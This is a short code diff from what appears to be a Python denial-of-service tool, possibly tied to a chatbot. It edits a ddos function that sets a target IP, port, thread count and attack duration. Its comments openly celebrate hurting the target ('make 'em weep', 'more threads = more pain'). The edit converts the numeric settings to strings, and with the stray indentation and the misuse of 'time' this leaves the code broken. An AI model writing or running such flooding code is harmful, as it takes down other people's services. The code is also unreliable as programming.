@@ -96,10 +96,10 @@ def ai_response(prompt):
 def ddos(target, port, duration, threads):
     global stop_ddos
     # ⚠️ FILL THIS SHIT OUT ⚠️
-TARGET_IP = (target)  # 🎯 Target's IP (make 'em weep)
-TARGET_PORT = {port}  # 🔥 Common ports: 80 (HTTP), 443 (HTTPS)
-THREAD_COUNT = {threads}  # 👹 More threads = more pain
-ATTACK_DURATION = {time}  # ⏳ Seconds to fuck their shit up
+TARGET_IP = str(target)  # 🎯 Target's IP (make 'em weep)
+TARGET_PORT = str(port)  # 🔥 Common ports: 80 (HTTP), 443 (HTTPS)
+THREAD_COUNT = str(threads)  # 👹 More threads = more pain
+ATTACK_DURATION = str(time)  # ⏳ Seconds to fuck their shit up
 
 while time.time() < start_time + ATTACK_DURATION:
         try:
